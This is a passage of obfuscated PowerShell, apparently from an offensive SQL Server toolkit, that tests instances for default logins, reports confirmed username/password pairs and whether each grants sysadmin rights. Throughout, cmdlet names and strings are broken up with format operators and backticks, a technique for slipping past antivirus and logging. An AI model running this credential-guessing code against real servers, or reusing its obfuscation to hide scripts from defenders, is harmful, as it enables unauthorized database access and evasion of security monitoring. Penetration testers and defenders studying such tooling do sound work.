        ${l`O`gIn`TeSt} = &("{2}{1}{3}{0}" -f'o','erver','Get-SQLS','Inf') -Instance ${Inst`A`NcE} -Username ${c`UrR`E`NTus`er`NaMe} -Password ${cUr`RenTp`AS`Sw`OrD} -SuppressVerbose
        if (${LoGi`NTE`ST}) {
            ("$Instance "+': '+'C'+'onfirmed'+' '+'default'+' '+'cre'+'de'+'ntial'+'s '+'- '+"$CurrentUsername/$CurrentPassword")
            ${sY`sadmiNsT`AtuS} = ${LOGINt`e`ST} | &("{0}{1}"-f 'sel','ect') ("{1}{0}{2}" -f 'a','IsSys','dmin') -ExpandProperty ("{0}{2}{1}" -f 'Is','in','Sysadm')                   
            ${TbLRes`UL`TS}."r`ows".("{0}{1}"-f 'A','dd').Invoke(
                ${CO`Mput`eRNa`Me},
                ${iNSt`A`N`CE},
                ${cURr`e`NTu`se`Rn`AMe},
                ${cUrREntpA`S`Sw`O`RD},
                ${S`YsAdMIn`stAT`US}
            ) | &("{1}{0}{2}"-f 'ut-Nu','O','ll')
        } else {
            ("$Instance "+': '+'No'+' '+'c'+'red'+'en'+'tial '+'mat'+'ches'+' '+'w'+'ere '+'found'+'.')
        }
    } End {
        ForEach (${r`ESuLT} in ${T`BLR`esulTS}) {
            ("{1}{2}{0}"-f' : ','Com','puter  ') + ${ReSU`lt}."CoM`Pu`TeR" 
            ("{2}{1}{0}" -f': ','e   ','Instanc') + ${rESu`lT}."Inst`An`cE" 
            ("{2}{1}{0}"-f'  : ','rname ','Use') + ${re`Sult}."user`N`AME" 
            ("{0}{2}{1}"-f 'Pa','d   : ','sswor') + ${RE`sULT}."P`ASS`worD" 
            ("{1}{3}{0}{2}" -f'd','IsS','min : ','ysA') + ${REsU`Lt}."i`SsysA`DmIN" 
            ""
        }
    }
}